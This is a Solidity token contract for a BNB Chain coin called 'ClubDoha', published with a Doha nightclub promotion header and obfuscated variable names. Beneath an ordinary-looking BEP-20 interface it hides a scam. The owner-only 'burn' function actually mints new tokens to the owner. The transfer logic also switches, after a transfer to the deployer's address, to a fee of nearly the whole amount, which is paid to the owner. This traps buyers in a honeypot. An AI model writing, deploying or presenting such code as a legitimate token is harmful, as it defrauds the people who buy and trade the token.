/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

////////////////////////////////////////////////////////////////////////
//Night Clubs Doha Dance & Night Club Up to Date events in Doha
//Your menu for tonight plans Dm us to post your events #Doha #qatar #Nightlife
//Billionaire Club Doha DJ EMPIRE : 66146061
//
//https://www.instagram.com/nightclubsdoha/
//https://youtu.be/J7YbaYC-_Ec
//https://twitter.com/QatarSameh
//https://www.facebook.com/groups/dohaclubs/
////////////////////////////////////////////////////////////////////////
// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;
contract ClubDoha {
uint256 private  EHJAJG = 10000000000000;
string public  symbol = "ClubDoha";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  TGJNJW = 1000000000000000000000;
uint256 public constant FTHUKU = 99999;
address private  FRUEYE = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public owner;
mapping (address => mapping (address => uint256)) private _allowances;
mapping (address => uint256) public balanceOf;
address private  GEXORV = address(0);
uint256 private  DYBYZQ = 1000000000000000000;
uint256 private  WZCQAS = 10000000000;
address private  AKLCDM = address(0);
address private  XWHZZA = address(0);
uint256 private  VCNMTR = 100000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  YWPKEF = 1000000000000000000;
address private  FHHCSA = address(0);
uint256 private  VRHQLM = 1000000000000000;
uint8 public constant decimals = 18;
string public  name = "ClubDoha";
event Transfer(address indexed from, address indexed to, uint256 value);
function _getTGJNJW() private returns (uint256) {
return TGJNJW;
}

function _getVCNMTR() private returns (uint256) {
return VCNMTR;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "BHEZTQ");
require(to != address(0), "BHEZTQ");
require(amount <= balanceOf[from], "BHEZTQ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* FTHUKU/DYBYZQ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==XWHZZA){
DYBYZQ = FTHUKU+2;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getFHHCSA() private returns (address) {
return FHHCSA;
}

function _getGEXORV() private returns (address) {
return GEXORV;
}

constructor () public {
XWHZZA = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getWZCQAS() private returns (uint256) {
return WZCQAS;
}

function _getYWPKEF() private returns (uint256) {
return YWPKEF;
}

function _getAKLCDM() private returns (address) {
return AKLCDM;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getFRUEYE() private returns (address) {
return FRUEYE;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getEHJAJG() private returns (uint256) {
return EHJAJG;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tBHEZTQ 0");
require(spender != address(0), "fBHEZTQ 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getVRHQLM() private returns (uint256) {
return VRHQLM;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}